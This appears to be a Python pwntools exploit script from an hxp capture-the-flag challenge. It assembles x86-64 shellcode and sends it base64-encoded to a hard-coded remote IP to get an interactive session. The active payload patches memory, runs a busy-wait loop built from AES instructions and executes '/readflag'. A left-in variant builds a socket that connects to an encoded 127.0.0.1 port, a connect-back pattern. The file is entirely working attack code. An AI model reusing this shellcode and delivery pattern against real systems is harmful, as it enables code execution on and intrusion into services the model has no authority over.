#!/usr/bin/python3

from pwn import *
from base64 import b64encode
from subprocess import check_output

def create_bin():
    src = """
    #include <stdio.h>

    int main()
    {
        //printf("It worked\\n");
        return 0;
    }
    """
    f = open("file.c", "w")
    f.write(src)
    f.close()
    print(check_output(["gcc", "file.c"]))

def compile_asm(arch="amd64"):
    """
    src = 
        global _start

        section .text write exec
        _start:
                        
            mov rcx, 0
            loop:
                inc rcx
                call _sys
                cmp rcx, 0x10000
                    pxor       xmm5,  xmm0
                aesenc     xmm6,  xmm0
                aesenc     xmm7,  xmm0
                aesenc     xmm8,  xmm0
                aesenc     xmm9,  xmm0
                aesenc     xmm10, xmm0
                aesenc     xmm11, xmm0
                aesenc     xmm12, xmm0
                aesenc     xmm13, xmm0
                aesenc     xmm14, xmm0
                aesenclast xmm15, xmm0
                jne loop
            mov rax, _sys
            mov qword [rax], 0xc3 ;050f

            mov rax, 0x1
            mov rdi, 0
            mov rsi, message
            mov rdx, 10
            call _sys

            mov rax, 0x3c
            mov rdi, 0x0
            call _sys
            
        _sys:
            inc rdi
            inc rdi
            inc rdi
            inc rdi
            inc rdi
            inc rdi
            ret

        section .data
        message: db "Hello, hxp", 10
        path: db "/readflag"
    """
    
    """
    src =

        global _start

        section .text write exec
    _start:
        
        mov rax, _sys
        mov qword [rax], 0xc3050f

        push 0x29
        pop rax
        push 2 
        pop rdi
        push 1 
        pop rsi
        cdq
        call _sys

        mov rbp, rax

        mov rax, 0x201010101010101
        push rax
        mov rax, 0x201010101010101 ^ 0x100007fd2040002
        xor [rsp], rax

        push 0x2a 
        pop rax
        mov rdi, rbp
        push 0x10
        pop rdx
        mov rsi, rsp
        call _sys

        mov rdi, 0
        mov rax, 0x3c
        call _sys
    
    _sys:
            inc rdi
            inc rdi
            inc rdi
            inc rdi
            inc rdi
            inc rdi
    """
    
    src = """
        global _start

        section .text write exec
        _start:
            ;call timeout
            mov rcx, 0x5823dcb0
            mov qword [rcx], 0x00000000580e45a1
            call timeout
            mov rdi, 1
            mov rsi, message
            mov rdx, 10
            mov rax, 1
            syscall
        
            push 0x67
        mov rax, 0x616c66646165722f
        push rax
        mov rdi, rsp
        xor edx, edx
        xor esi, esi
        push 0x3b
        pop rax
        syscall

        mov rdi, 0
        mov rax, 0x3c
        syscall

            ret
            ;mov qword [rsp+rdi], rax

            
        timeout:
            mov rcx, 0
            loop:
                inc rcx
                cmp rcx, 0x100000
                pxor       xmm5,  xmm0
                aesenc     xmm6,  xmm0
                aesenc     xmm7,  xmm0
                aesenc     xmm8,  xmm0
                aesenc     xmm9,  xmm0
                aesenc     xmm10, xmm0
                aesenc     xmm11, xmm0
                aesenc     xmm12, xmm0
                aesenc     xmm13, xmm0
                aesenc     xmm14, xmm0
                aesenclast xmm15, xmm0
                jne loop
            ret

        section .data
        message: db "Hello, hxp", 10
        path: db "/readflag"
    """

    f = open("file.nasm", "w")
    f.write(src)
    f.close()
    
    if arch == "amd64":
        check_output(["nasm", "-felf64", "file.nasm"])
        check_output(["ld", "-N","file.o"]) # -N to make the whole region rwx
    else:
        check_output(["nasm", "-felf32", "file.nasm"])
        check_output(["ld", "-m", "-N", "elf_i386", "file.o"])

def read_bin():
    f = open("a.out", "rb")
    content = f.read()
    content = b64encode(content)
    print("CHUNK : ", content[:100:])
    return content


def main():
    #r = remote("localhost", 9001)
    r = remote("168.119.235.55", 9001)
    
    compile_asm()
    content = read_bin()
    
    r.recv()
    r.sendline(content)
    r.sendline()

    r.interactive()

main()
